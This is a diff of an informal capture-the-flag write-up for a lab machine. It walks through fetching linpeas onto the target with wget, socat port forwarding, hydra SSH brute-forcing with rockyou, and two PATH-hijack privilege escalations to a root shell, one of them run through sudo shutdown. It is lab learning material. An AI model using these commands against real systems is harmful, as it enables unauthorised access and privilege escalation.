@@ -323,10 +323,11 @@ so,in my mind i was "YEAH IS IT, WHEN I DECODE THIS, WILL BE AN PASSWORD" but no
 and i decided run linpeas since that i didn't find literally nothing, then...
 
 ```bash
-my machine-
+in my machine:
 $ cd /home/akame/tools
 $ python3 -m http.server 8000
-yotf machine-
+
+in yotf machine:
 $ cd /tmp/
 $ wget http://$myip:8000/linpeas.sh
 $ chmod +x linpeas.sh
@@ -341,7 +342,7 @@ often i ignore this because i'm dumb. But maybe i can get user fox or rascal wit
 
 i never did it, so it's a new thecnique that i'm gonna learn today! This blog i'll help me with this [infosec writeup port forwarding](https://infosecwriteups.com/gain-access-to-an-internal-machine-using-port-forwarding-penetration-testing-518c0b6a4a0e), and how are you gonna do this? dunno :D i need to read the blog first wait a minute and i'll explain here too.
 
-i'm lying,i'm not gonna explain this here but i'll give to you a link to my notes in notion if you want to read or just read the blog. So when i wake up today i'm thinking about how i could get another using this thecnique if i don't have any passwords....Probaly a brute forcing again i think so
+i'm lying,i'm not gonna explain this here but i'll give to you a link to my notes in notion [here](https://vivacious-church-b42.notion.site/port-forwarding-da3f15d4da6c4d06b2488687267165c2?pvs=25) if you want to read or just read the blog. So when i wake up today i'm thinking about how i could get another using this thecnique if i don't have any passwords....Probaly a brute forcing again i think so
 
 after a few hours i understand the port forwarding thecnique and i'm gonna use socat to do this local port forwarding.
 
@@ -353,7 +354,7 @@ $ sudo apt update && sudo apt install socat # help us to make the port forwardin
 $ cd /usr/bin
 $ python3 -m http.server 8080
 
-in rev shell:
+in yotf machine:
 $ wget http://$myip:8080/socat
 $ ./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22 &
 ```
@@ -383,4 +384,63 @@ $ hydra -l fox -P /usr/share/wordlists/wordlists/rockyou.txt ssh://$ip:8888 -V -
 ```
 
 ![](attachments/Pasted%20image%2020231019111541.png)
+so,now i'm going to escalate to root, let's see what we have.
+![](attachments/Pasted%20image%2020231020050215.png)
+ok, good things here, maybe i can overwrite using PATH or something like this?
 
+$ mkdir /tmp/foo # create random directory to put the script
+
+$ echo "/bin/sh" > /tmp/foo/date # create the script that will launch /bin/sh
+
+$ chmod 777 /tmp/foo/date # mark it as executable
+
+$ PATH=/tmp/foo:$PATH 
+
+$ /home/rabbit/teaParty
+
+$ whoami 
+hatter
+
+explanation from this blog [here](https://blog.creekorful.org/2020/09/setuid-privilege-escalation/)
+	
+	    How does the PATH work exactly?
+	    
+	    The PATH variable is used to lookup executables when issuing command. It is composed of directories to include while searching, separated by a semicolon ‘:'.
+	    
+	    For example: /usr/local/bin:/usr/bin:/bin means that executables will be searched in the following directories:
+	    
+	        /usr/local/bin
+	        /usr/bin
+	        /bin
+	    
+	    The search will stop when the executable is found. It means that if apt is present in /usr/local/bin/apt it will not be searched in the others    directories
+
+and this what i'll do is overwrite the path and create a file that contains "/bin/bash" inside called by poweroff(probaly is an command or something like this used in shutdown)
+
+i'm gonna take a look at hidra to see if is really it
+![](attachments/Pasted%20image%2020231020052653.png)
+yeah, so now it's explained ;)
+
+```bash 
+$ cd /tmp
+$ echo "/bin/bash" > poweroff
+$ chmod +x poweroff
+$ export PATH=/tmp:$PATH
+$ sudo /usr/sbin/shutdown
+# whoami
+```
+
+![](attachments/Pasted%20image%2020231020051016.png)
+
+now is just go to root directory and....omg this is such a pain
+![](attachments/Pasted%20image%2020231020051106.png)
+
+
+maybe rascal is the user that contains this flag? i'm only logged with fox user so...
+![](attachments/Pasted%20image%2020231020051437.png)
+
+HHAHAAHA LMAO, i like it.
+
+and this prize? i didn't get nothing, i decoded to base64 and it gives to me a hash but i couldn't break it :( 
+
+but its ok, we finally finish this machine omg! It was so funny :D 
